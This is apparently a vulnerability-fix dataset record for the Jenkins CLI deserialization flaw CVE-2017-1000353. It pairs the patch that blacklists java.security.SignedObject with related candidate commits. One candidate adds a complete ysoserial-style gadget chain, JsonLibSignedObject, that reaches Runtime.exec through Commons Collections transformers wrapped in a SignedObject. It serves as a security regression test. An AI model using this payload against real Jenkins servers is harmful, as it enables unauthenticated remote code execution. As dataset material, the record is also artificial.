{
  "cve_id": "CVE-2017-1000353",
  "cve_desc": "Jenkins versions 2.56 and earlier as well as 2.46.1 LTS and earlier are vulnerable to an unauthenticated remote code execution. An unauthenticated remote code execution vulnerability allowed attackers to transfer a serialized Java `SignedObject` object to the Jenkins CLI, that would be deserialized using a new `ObjectInputStream`, bypassing the existing blacklist-based protection mechanism. We're fixing this issue by adding `SignedObject` to the blacklist. We're also backporting the new HTTP CLI protocol from Jenkins 2.54 to LTS 2.46.2, and deprecating the remoting-based (i.e. Java serialization) CLI protocol, disabling it by default.",
  "repo": "jenkinsci/jenkins",
  "patch_hash": "36b8285a41eb28333549e8d851f81fd80a184076",
  "patch_info": {
    "commit_hash": "36b8285a41eb28333549e8d851f81fd80a184076",
    "repo": "jenkinsci/jenkins",
    "commit_url": "https://github.com/jenkinsci/jenkins/commit/36b8285a41eb28333549e8d851f81fd80a184076",
    "files": [
      "core/src/main/java/jenkins/model/Jenkins.java",
      "pom.xml",
      "test/src/test/java/jenkins/security/Security218CliTest.java"
    ],
    "message": "[SECURITY-429] Fixing by blacklisting SignedObject.",
    "before_after_code_files": [
      "core/src/main/java/jenkins/model/Jenkins.java||core/src/main/java/jenkins/model/Jenkins.java",
      "test/src/test/java/jenkins/security/Security218CliTest.java||test/src/test/java/jenkins/security/Security218CliTest.java"
    ]
  },
  "patch_diff": {
    "core/src/main/java/jenkins/model/Jenkins.java||core/src/main/java/jenkins/model/Jenkins.java": [
      "File: core/src/main/java/jenkins/model/Jenkins.java -> core/src/main/java/jenkins/model/Jenkins.java",
      "--- Hunk 1 ---",
      "[Context before]",
      "296: import static hudson.Util.*;",
      "297: import static hudson.init.InitMilestone.*;",
      "298: import hudson.util.LogTaskListener;",
      "299: import static java.util.logging.Level.*;",
      "300: import static javax.servlet.http.HttpServletResponse.*;",
      "301: import org.kohsuke.stapler.WebMethod;",
      "",
      "[Removed Lines]",
      "[None]",
      "",
      "[Added Lines]",
      "298: import hudson.remoting.ClassFilter;",
      "301: import java.util.regex.Pattern;",
      "",
      "---------------",
      "--- Hunk 2 ---",
      "[Context before]",
      "813:             adjuncts = new AdjunctManager(servletContext, pluginManager.uberClassLoader,\"adjuncts/\"+SESSION_HASH, TimeUnit2.DAYS.toMillis(365));",
      "816:             executeReactor( is,",
      "817:                     pluginManager.initTasks(is),    // loading and preparing plugins",
      "",
      "[Removed Lines]",
      "[None]",
      "",
      "[Added Lines]",
      "817:             ClassFilter.appendDefaultFilter(Pattern.compile(\"java[.]security[.]SignedObject\")); // TODO move to standard blacklist",
      "",
      "---------------"
    ],
    "test/src/test/java/jenkins/security/Security218CliTest.java||test/src/test/java/jenkins/security/Security218CliTest.java": [
      "File: test/src/test/java/jenkins/security/Security218CliTest.java -> test/src/test/java/jenkins/security/Security218CliTest.java",
      "--- Hunk 1 ---",
      "[Context before]",
      "32: import java.io.PrintStream;",
      "33: import jenkins.security.security218.Payload;",
      "34: import org.jenkinsci.remoting.RoleChecker;",
      "36: import org.junit.Test;",
      "37: import static org.junit.Assert.*;",
      "38: import org.junit.Rule;",
      "",
      "[Removed Lines]",
      "35: import org.junit.Ignore;",
      "",
      "[Added Lines]",
      "[None]",
      "",
      "---------------",
      "--- Hunk 2 ---",
      "[Context before]",
      "170:         probe(Payload.Ldap, PayloadCaller.EXIT_CODE_REJECTED);",
      "171:     }",
      "174:     @PresetData(PresetData.DataSet.ANONYMOUS_READONLY)",
      "175:     @Test",
      "176:     @Issue(\"SECURITY-429\")",
      "",
      "[Removed Lines]",
      "173:     @Ignore(\"TODO fails unless ^java[.]security[.]SignedObject is blacklisted\")",
      "",
      "[Added Lines]",
      "[None]",
      "",
      "---------------"
    ]
  },
  "candidates": [
    {
      "candidate_hash": "566cb370d7254087cbeb7cd713acff720e61b5ab",
      "candidate_info": {
        "commit_hash": "566cb370d7254087cbeb7cd713acff720e61b5ab",
        "repo": "jenkinsci/jenkins",
        "commit_url": "https://github.com/jenkinsci/jenkins/commit/566cb370d7254087cbeb7cd713acff720e61b5ab",
        "files": [
          "core/src/main/java/jenkins/model/Jenkins.java"
        ],
        "message": "Adjusting comment.",
        "before_after_code_files": [
          "core/src/main/java/jenkins/model/Jenkins.java||core/src/main/java/jenkins/model/Jenkins.java"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "same_branch_evolution": 1,
        "olp_code_files": {
          "patch": [
            "core/src/main/java/jenkins/model/Jenkins.java||core/src/main/java/jenkins/model/Jenkins.java"
          ],
          "candidate": [
            "core/src/main/java/jenkins/model/Jenkins.java||core/src/main/java/jenkins/model/Jenkins.java"
          ]
        }
      },
      "candidate_diff": {
        "core/src/main/java/jenkins/model/Jenkins.java||core/src/main/java/jenkins/model/Jenkins.java": [
          "File: core/src/main/java/jenkins/model/Jenkins.java -> core/src/main/java/jenkins/model/Jenkins.java",
          "--- Hunk 1 ---",
          "[Context before]",
          "876:             adjuncts = new AdjunctManager(servletContext, pluginManager.uberClassLoader,\"adjuncts/\"+SESSION_HASH, TimeUnit2.DAYS.toMillis(365));",
          "880:                 try {",
          "881:                     Field blacklistPatternsF = ClassFilter.DEFAULT.getClass().getDeclaredField(\"blacklistPatterns\");",
          "882:                     blacklistPatternsF.setAccessible(true);",
          "",
          "[Removed Lines]",
          "879:             if (System.getProperty(ClassFilter.FILE_OVERRIDE_LOCATION_PROPERTY) == null) { // TODO 2.4+ SystemProperties",
          "",
          "[Added Lines]",
          "879:             if (System.getProperty(ClassFilter.FILE_OVERRIDE_LOCATION_PROPERTY) == null) { // not using SystemProperties since ClassFilter does not either",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "69828cd85ccfb6c0cb66609c80628ad64052bfcd",
      "candidate_info": {
        "commit_hash": "69828cd85ccfb6c0cb66609c80628ad64052bfcd",
        "repo": "jenkinsci/jenkins",
        "commit_url": "https://github.com/jenkinsci/jenkins/commit/69828cd85ccfb6c0cb66609c80628ad64052bfcd",
        "files": [
          "core/src/main/java/hudson/slaves/SlaveComputer.java",
          "core/src/main/java/jenkins/model/Jenkins.java",
          "pom.xml"
        ],
        "message": "Upgrade Remoting to 3.11 (#2988)\n\n* Use ClassFilter.appendDefaultFilter.\n\n* FindBugs\n\n* Update Jenkins Remoting to 3.11, fix reported FindBugs issues\n\n(cherry picked from commit dc8000cc1e36399595883858c3aae8f135177d49)",
        "before_after_code_files": [
          "core/src/main/java/hudson/slaves/SlaveComputer.java||core/src/main/java/hudson/slaves/SlaveComputer.java",
          "core/src/main/java/jenkins/model/Jenkins.java||core/src/main/java/jenkins/model/Jenkins.java"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "same_branch_evolution": 1,
        "olp_code_files": {
          "patch": [
            "core/src/main/java/jenkins/model/Jenkins.java||core/src/main/java/jenkins/model/Jenkins.java"
          ],
          "candidate": [
            "core/src/main/java/jenkins/model/Jenkins.java||core/src/main/java/jenkins/model/Jenkins.java"
          ]
        }
      },
      "candidate_diff": {
        "core/src/main/java/hudson/slaves/SlaveComputer.java||core/src/main/java/hudson/slaves/SlaveComputer.java": [
          "File: core/src/main/java/hudson/slaves/SlaveComputer.java -> core/src/main/java/hudson/slaves/SlaveComputer.java",
          "--- Hunk 1 ---",
          "[Context before]",
          "454:         }",
          "455:         @Override public Integer call() {",
          "456:             Channel c = Channel.current();",
          "457:             return resource ? c.resourceLoadingCount.get() : c.classLoadingCount.get();",
          "458:         }",
          "459:     }",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "457:             if (c == null) {",
          "458:                 return -1;",
          "459:             }",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "471:         }",
          "472:         @Override public Long call() {",
          "473:             Channel c = Channel.current();",
          "474:             return resource ? c.resourceLoadingTime.get() : c.classLoadingTime.get();",
          "475:         }",
          "476:     }",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "477:             if (c == null) {",
          "478:                 return Long.valueOf(-1);",
          "479:             }",
          "",
          "---------------"
        ],
        "core/src/main/java/jenkins/model/Jenkins.java||core/src/main/java/jenkins/model/Jenkins.java": [
          "File: core/src/main/java/jenkins/model/Jenkins.java -> core/src/main/java/jenkins/model/Jenkins.java",
          "--- Hunk 1 ---",
          "[Context before]",
          "251: import java.io.IOException;",
          "252: import java.io.InputStream;",
          "253: import java.io.PrintWriter;",
          "255: import java.net.BindException;",
          "256: import java.net.HttpURLConnection;",
          "257: import java.net.URL;",
          "",
          "[Removed Lines]",
          "254: import java.lang.reflect.Field;",
          "",
          "[Added Lines]",
          "[None]",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "904:             adjuncts = new AdjunctManager(servletContext, pluginManager.uberClassLoader,\"adjuncts/\"+SESSION_HASH, TimeUnit2.DAYS.toMillis(365));",
          "926:             }",
          "",
          "[Removed Lines]",
          "907:             if (System.getProperty(ClassFilter.FILE_OVERRIDE_LOCATION_PROPERTY) == null) { // not using SystemProperties since ClassFilter does not either",
          "908:                 try {",
          "909:                     Field blacklistPatternsF = ClassFilter.DEFAULT.getClass().getDeclaredField(\"blacklistPatterns\");",
          "910:                     blacklistPatternsF.setAccessible(true);",
          "911:                     Object[] blacklistPatternsA = (Object[]) blacklistPatternsF.get(ClassFilter.DEFAULT);",
          "912:                     boolean found = false;",
          "913:                     for (int i = 0; i < blacklistPatternsA.length; i++) {",
          "914:                         if (blacklistPatternsA[i] instanceof Pattern) {",
          "915:                             blacklistPatternsA[i] = Pattern.compile(\"(\" + blacklistPatternsA[i] + \")|(java[.]security[.]SignedObject)\");",
          "916:                             found = true;",
          "917:                             break;",
          "918:                         }",
          "919:                     }",
          "920:                     if (!found) {",
          "921:                         throw new Error(\"no Pattern found among \" + Arrays.toString(blacklistPatternsA));",
          "922:                     }",
          "923:                 } catch (NoSuchFieldException | IllegalAccessException x) {",
          "924:                     throw new Error(\"Unexpected ClassFilter implementation in bundled remoting.jar: \" + x, x);",
          "925:                 }",
          "",
          "[Added Lines]",
          "905:             try {",
          "906:                 ClassFilter.appendDefaultFilter(Pattern.compile(\"java[.]security[.]SignedObject\")); // TODO move to standard blacklist",
          "907:             } catch (ClassFilter.ClassFilterException ex) {",
          "908:                 throw new IOException(\"Remoting library rejected the java[.]security[.]SignedObject blacklist pattern\", ex);",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "f237601afd750a0eaaf961e8120b08de238f2c3f",
      "candidate_info": {
        "commit_hash": "f237601afd750a0eaaf961e8120b08de238f2c3f",
        "repo": "jenkinsci/jenkins",
        "commit_url": "https://github.com/jenkinsci/jenkins/commit/f237601afd750a0eaaf961e8120b08de238f2c3f",
        "files": [
          "test/src/test/java/jenkins/security/Security218CliTest.java",
          "test/src/test/java/jenkins/security/security218/Payload.java",
          "test/src/test/java/jenkins/security/security218/ysoserial/payloads/JsonLibSignedObject.java"
        ],
        "message": "[SECURITY-429] Reproduced in test.",
        "before_after_code_files": [
          "test/src/test/java/jenkins/security/Security218CliTest.java||test/src/test/java/jenkins/security/Security218CliTest.java",
          "test/src/test/java/jenkins/security/security218/Payload.java||test/src/test/java/jenkins/security/security218/Payload.java",
          "test/src/test/java/jenkins/security/security218/ysoserial/payloads/JsonLibSignedObject.java||test/src/test/java/jenkins/security/security218/ysoserial/payloads/JsonLibSignedObject.java"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "same_branch_evolution": 1,
        "olp_code_files": {
          "patch": [
            "test/src/test/java/jenkins/security/Security218CliTest.java||test/src/test/java/jenkins/security/Security218CliTest.java"
          ],
          "candidate": [
            "test/src/test/java/jenkins/security/Security218CliTest.java||test/src/test/java/jenkins/security/Security218CliTest.java"
          ]
        }
      },
      "candidate_diff": {
        "test/src/test/java/jenkins/security/Security218CliTest.java||test/src/test/java/jenkins/security/Security218CliTest.java": [
          "File: test/src/test/java/jenkins/security/Security218CliTest.java -> test/src/test/java/jenkins/security/Security218CliTest.java",
          "--- Hunk 1 ---",
          "[Context before]",
          "170:         probe(Payload.Ldap, PayloadCaller.EXIT_CODE_REJECTED);",
          "171:     }",
          "173:     private void probe(Payload payload, int expectedResultCode) throws Exception {",
          "174:         File file = File.createTempFile(\"security-218\", payload + \"-payload\");",
          "175:         File moved = new File(file.getAbsolutePath() + \"-moved\");",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "173:     @Ignore(\"TODO fails unless ^java[.]security[.]SignedObject is blacklisted\")",
          "174:     @PresetData(PresetData.DataSet.ANONYMOUS_READONLY)",
          "175:     @Test",
          "176:     @Issue(\"SECURITY-429\")",
          "177:     public void jsonLibSignedObject() throws Exception {",
          "178:         probe(Payload.JsonLibSignedObject, PayloadCaller.EXIT_CODE_REJECTED);",
          "179:     }",
          "",
          "---------------"
        ],
        "test/src/test/java/jenkins/security/security218/Payload.java||test/src/test/java/jenkins/security/security218/Payload.java": [
          "File: test/src/test/java/jenkins/security/security218/Payload.java -> test/src/test/java/jenkins/security/security218/Payload.java",
          "--- Hunk 1 ---",
          "[Context before]",
          "47:     Spring1(Spring1.class),",
          "48:     Spring2(Spring2.class),",
          "49:     Ldap(Ldap.class),",
          "50:     ;",
          "52:     private final Class<? extends ObjectPayload> payloadClass;",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "50:     JsonLibSignedObject(JsonLibSignedObject.class),",
          "",
          "---------------"
        ],
        "test/src/test/java/jenkins/security/security218/ysoserial/payloads/JsonLibSignedObject.java||test/src/test/java/jenkins/security/security218/ysoserial/payloads/JsonLibSignedObject.java": [
          "File: test/src/test/java/jenkins/security/security218/ysoserial/payloads/JsonLibSignedObject.java -> test/src/test/java/jenkins/security/security218/ysoserial/payloads/JsonLibSignedObject.java",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: package jenkins.security.security218.ysoserial.payloads;",
          "3: import java.io.ObjectStreamException;",
          "4: import java.io.Serializable;",
          "5: import java.lang.reflect.Field;",
          "6: import java.security.KeyPair;",
          "7: import java.security.KeyPairGenerator;",
          "8: import java.security.PrivateKey;",
          "9: import java.security.PublicKey;",
          "10: import java.security.Signature;",
          "11: import java.security.SignedObject;",
          "12: import java.util.Comparator;",
          "13: import java.util.HashMap;",
          "14: import java.util.HashSet;",
          "15: import java.util.Map;",
          "16: import java.util.concurrent.ConcurrentSkipListSet;",
          "17: import java.util.concurrent.CopyOnWriteArraySet;",
          "18: import net.sf.json.JSONArray;",
          "19: import org.apache.commons.collections.Transformer;",
          "20: import org.apache.commons.collections.collection.AbstractCollectionDecorator;",
          "21: import org.apache.commons.collections.functors.ChainedTransformer;",
          "22: import org.apache.commons.collections.functors.ConstantTransformer;",
          "23: import org.apache.commons.collections.functors.InvokerTransformer;",
          "24: import org.apache.commons.collections.keyvalue.TiedMapEntry;",
          "25: import org.apache.commons.collections.map.LazyMap;",
          "26: import org.apache.commons.collections.map.ReferenceMap;",
          "27: import org.apache.commons.collections.set.ListOrderedSet;",
          "30: public class JsonLibSignedObject implements ObjectPayload<Object> {",
          "32:     @Override",
          "33:     public Object getObject(String cmd) throws Exception {",
          "34:         final String[] execArgs = new String[] { cmd };",
          "36:         final Transformer[] transformers = new Transformer[] {",
          "37:                 new ConstantTransformer(Runtime.class),",
          "38:                 new InvokerTransformer(\"getMethod\", new Class[] { String.class,",
          "39:                         Class[].class }, new Object[] { \"getRuntime\",",
          "40:                         new Class[0] }),",
          "41:                 new InvokerTransformer(\"invoke\", new Class[] { Object.class,",
          "42:                         Object[].class }, new Object[] { null, new Object[0] }),",
          "43:                 new InvokerTransformer(\"exec\", new Class[] { String.class },",
          "44:                         execArgs), new ConstantTransformer(1) };",
          "46:         Transformer transformerChain = new ChainedTransformer(transformers);",
          "48:         final Map innerMap = new HashMap();",
          "50:         final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);",
          "52:         TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\");",
          "54:         HashSet map = new HashSet(1);",
          "55:         map.add(\"foo\");",
          "56:         Field f = null;",
          "57:         try {",
          "58:             f = HashSet.class.getDeclaredField(\"map\");",
          "59:         } catch (NoSuchFieldException e) {",
          "60:             f = HashSet.class.getDeclaredField(\"backingMap\");",
          "61:         }",
          "63:         f.setAccessible(true);",
          "64:         HashMap innimpl = (HashMap) f.get(map);",
          "66:         Field f2 = null;",
          "67:         try {",
          "68:             f2 = HashMap.class.getDeclaredField(\"table\");",
          "69:         } catch (NoSuchFieldException e) {",
          "70:             f2 = HashMap.class.getDeclaredField(\"elementData\");",
          "71:         }",
          "73:         f2.setAccessible(true);",
          "74:         Object[] array2 = (Object[]) f2.get(innimpl);",
          "76:         Object node = array2[0];",
          "77:         if (node == null) {",
          "78:             node = array2[1];",
          "79:         }",
          "81:         Field keyField = null;",
          "82:         try {",
          "83:             keyField = node.getClass().getDeclaredField(\"key\");",
          "84:         } catch (Exception e) {",
          "85:             keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(",
          "86:                     \"key\");",
          "87:         }",
          "89:         keyField.setAccessible(true);",
          "90:         keyField.set(node, entry);",
          "92:         KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(\"DSA\");",
          "93:         keyPairGenerator.initialize(1024);",
          "94:         KeyPair keyPair = keyPairGenerator.genKeyPair();",
          "95:         PrivateKey privateKey = keyPair.getPrivate();",
          "96:         PublicKey publicKey = keyPair.getPublic();",
          "98:         Signature signature = Signature.getInstance(privateKey.getAlgorithm());",
          "99:         SignedObject payload = new SignedObject(map, privateKey, signature);",
          "100:         JSONArray array = new JSONArray();",
          "102:         array.add(\"asdf\");",
          "104:         ListOrderedSet set = new ListOrderedSet();",
          "105:         Field f1 = AbstractCollectionDecorator.class",
          "106:                 .getDeclaredField(\"collection\");",
          "107:         f1.setAccessible(true);",
          "108:         f1.set(set, array);",
          "110:         DummyComperator comp = new DummyComperator();",
          "111:         ConcurrentSkipListSet csls = new ConcurrentSkipListSet(comp);",
          "112:         csls.add(payload);",
          "114:         CopyOnWriteArraySet a1 = new CopyOnWriteArraySet();",
          "115:         CopyOnWriteArraySet a2 = new CopyOnWriteArraySet();",
          "117:         a1.add(set);",
          "118:         Container c = new Container(csls);",
          "119:         a1.add(c);",
          "121:         a2.add(csls);",
          "122:         a2.add(set);",
          "124:         ReferenceMap flat3map = new ReferenceMap();",
          "125:         flat3map.put(new Container(a1), \"asdf\");",
          "126:         flat3map.put(new Container(a2), \"asdf\");",
          "128:         return flat3map;",
          "129:     }",
          "131:     static class Container implements Serializable {",
          "133:         private Object o;",
          "135:         public Container(Object o) {",
          "136:             this.o = o;",
          "137:         }",
          "139:         private Object writeReplace() throws ObjectStreamException {",
          "140:             return o;",
          "141:         }",
          "143:     }",
          "145:     static class DummyComperator implements Comparator, Serializable {",
          "147:         public int compare(Object arg0, Object arg1) {",
          "149:             return 0;",
          "150:         }",
          "152:         private Object writeReplace() throws ObjectStreamException {",
          "153:             return null;",
          "154:         }",
          "156:     }",
          "158: }",
          "",
          "---------------"
        ]
      }
    }
  ]
}